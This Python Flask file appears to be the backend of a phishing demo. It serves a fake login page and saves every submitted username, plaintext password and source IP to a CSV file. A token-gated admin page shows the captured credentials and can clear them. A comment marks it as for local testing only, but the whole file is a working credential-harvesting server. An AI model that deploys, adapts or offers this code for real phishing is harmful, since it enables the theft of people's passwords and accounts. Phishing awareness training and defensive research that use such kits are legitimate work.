from flask import Flask, render_template, request, redirect, url_for, abort
import csv
import os
from datetime import datetime
import logging

app = Flask(__name__)

ROOT = os.path.dirname(os.path.dirname(__file__))  # ~/phishing
DATA_FILE = os.path.join(ROOT, 'captured_creds.csv')
LOG_FILE = os.path.join(ROOT, 'phishing.log')

# Configure simple file logger
logger = logging.getLogger('phishing_demo')
logger.setLevel(logging.INFO)
if not logger.handlers:
    fh = logging.FileHandler(LOG_FILE, encoding='utf-8')
    fmt = logging.Formatter('%(asctime)s %(levelname)s %(message)s')
    fh.setFormatter(fmt)
    logger.addHandler(fh)

def save_credential(username, password, source_ip):
    # Ensure CSV header
    write_header = not os.path.exists(DATA_FILE)
    with open(DATA_FILE, 'a', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        if write_header:
            writer.writerow(['timestamp','username','password','source_ip'])
        ts = datetime.utcnow().isoformat() + 'Z'
        writer.writerow([ts, username, password, source_ip])
    logger.info("Saved credential username=%r source_ip=%s", username, source_ip)

def read_entries():
    entries = []
    if not os.path.exists(DATA_FILE):
        return entries
    with open(DATA_FILE, newline='', encoding='utf-8') as f:
        reader = csv.DictReader(f)
        for row in reader:
            # mask password for display: show first character then stars (or '—' if empty)
            pwd = row.get('password', '')
            if pwd:
                masked = pwd[0] + '*' * max(1, len(pwd)-1)
            else:
                masked = '—'
            entries.append({
                'timestamp': row.get('timestamp',''),
                'username': row.get('username',''),
                'password': masked,
                'source_ip': row.get('source_ip','')
            })
    return entries

def require_admin_token(req):
    # Admin token is read from environment variable ADMIN_TOKEN
    token = os.environ.get('ADMIN_TOKEN', '')
    # prefer form token for POST, else query string token for GET
    got = req.form.get('token') if req.method == 'POST' else req.args.get('token')
    if not token or got != token:
        return False
    return True

@app.route('/', methods=['GET'])
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    source_ip = request.remote_addr
    save_credential(username, password, source_ip)
    return render_template('success.html')

# Admin listing page (GET)
@app.route('/admin', methods=['GET'])
def admin():
    if not require_admin_token(request):
        # Return 403 to avoid exposing info
        abort(403)
    entries = read_entries()
    return render_template('admin.html', entries=entries)

# Admin action to clear captured file (POST)
@app.route('/admin/clear', methods=['POST'])
def admin_clear():
    if not require_admin_token(request):
        abort(403)
    # clear the CSV file (delete it)
    try:
        if os.path.exists(DATA_FILE):
            os.remove(DATA_FILE)
            logger.info("Admin cleared captured_creds.csv")
    except Exception as e:
        logger.exception("Failed to clear data file: %s", e)
    return redirect(url_for('admin') + '?token=' + request.form.get('token',''))

# Simple 403 handler
@app.errorhandler(403)
def forbidden(e):
    return "403 Forbidden: admin token required.", 403

if __name__ == '__main__':
    # NOTE: local testing only
    app.run(host='127.0.0.1', port=5000, debug=False)
